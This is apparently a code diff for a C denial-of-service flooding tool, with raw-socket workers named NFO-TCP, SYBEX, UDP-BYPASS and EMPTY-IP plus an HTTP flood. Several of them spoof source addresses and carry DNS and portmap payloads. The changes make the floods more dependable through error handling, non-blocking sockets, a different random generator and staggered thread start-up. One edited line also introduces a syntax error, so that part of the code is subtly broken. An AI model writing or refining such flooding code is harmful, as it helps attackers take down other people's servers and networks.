@@ -136,12 +136,20 @@ void* nfo_tcp_worker(void *arg) {
     sin.sin_family = AF_INET;
     sin.sin_port = htons(floodport);
     sin.sin_addr.s_addr = inet_addr(td);
+    if (sin.sin_addr.s_addr == INADDR_NONE) {
+        printf("Error: Invalid target address\n");
+        return NULL;
+    }
     
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if(s < 0){
-        perror("socket");
+        printf("Socket creation failed (root required?): %s\n", strerror(errno));
         return NULL;
     }
+    
+    // Set socket to non-blocking to prevent hangs
+    int flags = fcntl(s, F_GETFL, 0);
+    fcntl(s, F_SETFL, flags | O_NONBLOCK);
     
     memset(datagram, 0, MAX_PACKET_SIZE);
     
@@ -172,7 +180,7 @@ void* nfo_tcp_worker(void *arg) {
     int tmp = 1;
     const int *val = &tmp;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
-        perror("setsockopt");
+        printf("Setsockopt failed: %s\n", strerror(errno));
         close(s);
         return NULL;
     }
@@ -184,10 +192,12 @@ void* nfo_tcp_worker(void *arg) {
     int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
     int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
     
+    printf("Thread started for NFO-TCP\n");
+    
     while(running) {
         // Packet construction
         tcph->check = 0;
-        tcph->seq = htonl(rand());
+        tcph->seq = htonl(rand_cmwc());
         tcph->doff = ((sizeof(struct tcphdr)) + 24)/4;
         tcph->dest = htons(floodport);
         
@@ -201,22 +211,27 @@ void* nfo_tcp_worker(void *arg) {
         tcph->dest = htons(floodport);
         tcph->check = tcpcsum(iph, tcph, 24);
         
-        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            if (errno != ENOBUFS) {
+        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+        if(send_result < 0) {
+            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
+                // Serious error, break out
                 break;
             }
+            // Temporary error, just continue
+            usleep(1000);
+            continue;
         }
         
         // TCP options modification
         char stronka[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
-        stronka[3] = mssvalues[rand() % 9];
+        stronka[3] = mssvalues[rand_cmwc() % 9];
         stronka[7] = randnum(6, 11);
         stronka[12] = randnum(1, 250);
         stronka[13] = randnum(1, 250);
         stronka[14] = randnum(1, 250);
         stronka[15] = randnum(1, 250);
         
-        tcph->window = htons(windows[rand() % 11]);
+        tcph->window = htons(windows[rand_cmwc() % 11]);
         const char *newpayload = stronka;
         memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
         
@@ -229,9 +244,13 @@ void* nfo_tcp_worker(void *arg) {
         
         __sync_fetch_and_add(&total_success, 1);
         __sync_fetch_and_add(&total_bytes, iph->tot_len);
+        
+        // Small delay to prevent overwhelming the system
+        usleep(10);
     }
     
     close(s);
+    printf("Thread exiting\n");
     return NULL;
 }
 
@@ -305,15 +324,25 @@ void* sybex_worker(void *arg) {
     }
     
     sin.sin_addr.s_addr = inet_addr(targettr);
-    
-    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-    if(s == -1) {
-        perror("socket");
+    if (sin.sin_addr.s_addr == INADDR_NONE) {
+        printf("Error: Invalid target address\n");
         return NULL;
     }
     
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s == -1) {
+        printf("Socket creation failed (root required?): %s\n", strerror(errno));
+        return NULL;
+    }
+    
+    // Set socket to non-blocking
+    int flags = fcntl(s, F_GETFL, 0);
+    fcntl(s, F_SETFL, flags | O_NONBLOCK);
+    
+    printf("Thread started for SYBEX\n");
+    
     while(running) {
-        char primera[16]; // Fixed buffer size for IP address
+        char primera[16];
         int one_r = randommexico(1, 250);
         int two_r = randommexico(1, 250);
         int three_r = randommexico(1, 250);
@@ -377,20 +406,24 @@ void* sybex_worker(void *arg) {
         int one = 1;
         const int *val = &one;
         if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
-            perror("setsockopt");
+            printf("Setsockopt failed: %s\n", strerror(errno));
             close(s);
             return NULL;
         }
         
-        if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
+        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+        if(send_result > 0) {
             __sync_fetch_and_add(&total_success, 1);
             __sync_fetch_and_add(&total_bytes, iph->tot_len);
+        } else if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
+            break;
         }
         
         usleep(1000);
     }
     
     close(s);
+    printf("Thread exiting\n");
     return NULL;
 }
 
@@ -426,7 +459,7 @@ unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
 }
 
 void setup_ip_header_udp(struct iphdr *iph) {
-    char ip[16]; // Fixed buffer size for IP address
+    char ip[16];
     snprintf(ip, sizeof(ip), "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
     iph->ihl = 5;
     iph->version = 4;
@@ -447,11 +480,13 @@ void vulnMix(struct iphdr *iph, struct udphdr *udph) {
     const char echo_payload[] = "\x0D\x0A\x0D\x0A";
     const char port111_payload[] = "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
     
-    size_t dns_len = sizeof(dns_payload) - 1; // -1 to exclude null terminator
+    size_t dns_len = sizeof(dns_payload) - 1;
     size_t echo_len = sizeof(echo_payload) - 1;
     size_t port111_len = sizeof(port111_payload) - 1;
     
-    switch(protocol[rand()%21]) {
+    int protocol_index = rand() % 21;
+    
+    switch(protocol[protocol_index]) {
         case 53: // DNS
             memcpy((void *)udph + sizeof(struct udphdr), dns_payload, dns_len);
             udph->len = htons(sizeof(struct udphdr) + dns_len);
@@ -477,7 +512,7 @@ void vulnMix(struct iphdr *iph, struct udphdr *udph) {
             memcpy((void *)udph + sizeof(struct udphdr), dns_payload, dns_len);
             udph->len = htons(sizeof(struct udphdr) + dns_len);
             udph->dest = htons(53);
-            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
+            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len);
             break;
     }
 }
@@ -491,12 +526,20 @@ void* udp_bypass_worker(void *arg) {
     
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = inet_addr(td);
+    if (sin.sin_addr.s_addr == INADDR_NONE) {
+        printf("Error: Invalid target address\n");
+        return NULL;
+    }
     
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     if(s < 0){
-        perror("socket");
+        printf("Socket creation failed (root required?): %s\n", strerror(errno));
         return NULL;
     }
+    
+    // Set socket to non-blocking
+    int flags = fcntl(s, F_GETFL, 0);
+    fcntl(s, F_SETFL, flags | O_NONBLOCK);
     
     memset(datagram, 0, MAX_PACKET_SIZE);
     setup_ip_header_udp(iph);
@@ -508,7 +551,7 @@ void* udp_bypass_worker(void *arg) {
     int tmp = 1;
     const int *val = &tmp;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
-        perror("setsockopt");
+        printf("Setsockopt failed: %s\n", strerror(errno));
         close(s);
         return NULL;
     }
@@ -516,11 +559,16 @@ void* udp_bypass_worker(void *arg) {
     init_rand(time(NULL));
     register unsigned int i = 0;
     
+    printf("Thread started for UDP-BYPASS\n");
+    
     while(running) {
-        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            if (errno != ENOBUFS) {
+        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+        if(send_result < 0) {
+            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
                 break;
             }
+            usleep(1000);
+            continue;
         }
         
         iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
@@ -539,9 +587,12 @@ void* udp_bypass_worker(void *arg) {
         
         __sync_fetch_and_add(&total_success, 1);
         __sync_fetch_and_add(&total_bytes, iph->tot_len);
+        
+        usleep(10);
     }
     
     close(s);
+    printf("Thread exiting\n");
     return NULL;
 }
 
@@ -556,13 +607,17 @@ void* empty_ip_flood_worker(void* arg) {
     
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (s < 0) {
-        perror("socket");
+        printf("Socket creation failed (root required?): %s\n", strerror(errno));
         return NULL;
     }
     
+    // Set socket to non-blocking
+    int flags = fcntl(s, F_GETFL, 0);
+    fcntl(s, F_SETFL, flags | O_NONBLOCK);
+    
     int one = 1;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt");
+        printf("Setsockopt failed: %s\n", strerror(errno));
         close(s);
         return NULL;
     }
@@ -570,6 +625,11 @@ void* empty_ip_flood_worker(void* arg) {
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = inet_addr(target);
+    if (sin.sin_addr.s_addr == INADDR_NONE) {
+        printf("Error: Invalid target address\n");
+        close(s);
+        return NULL;
+    }
     
     memset(packet, 0, sizeof(packet));
     
@@ -586,18 +646,25 @@ void* empty_ip_flood_worker(void* arg) {
     iph->daddr = sin.sin_addr.s_addr;
     iph->check = csum((unsigned short *)packet, sizeof(struct iphdr)/2);
     
+    printf("Thread started for EMPTY-IP\n");
+    
     while (running) {
-        if (sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            if (errno != ENOBUFS) {
+        int send_result = sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin));
+        if(send_result < 0) {
+            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
                 break;
             }
+            usleep(1000);
+            continue;
         }
+        
         __sync_fetch_and_add(&total_success, 1);
         __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr));
         usleep(1000);
     }
     
     close(s);
+    printf("Thread exiting\n");
     return NULL;
 }
 
@@ -623,6 +690,8 @@ void* http_flood_worker(void* arg) {
     };
     int ua_count = 3;
     
+    printf("Thread started for HTTP-FLOOD\n");
+    
     while (running) {
         curl = curl_easy_init();
         if (!curl) {
@@ -636,6 +705,7 @@ void* http_flood_worker(void* arg) {
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
         curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
+        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
         
         char url[512];
         char path[128];
@@ -683,6 +753,7 @@ void* http_flood_worker(void* arg) {
     }
     
     curl_global_cleanup();
+    printf("Thread exiting\n");
     return NULL;
 }
 
@@ -833,6 +904,7 @@ int main(int argc, char *argv[]) {
             break;
         }
         threads_created++;
+        usleep(10000); // Stagger thread creation
     }
     
     if (threads_created == 0) {
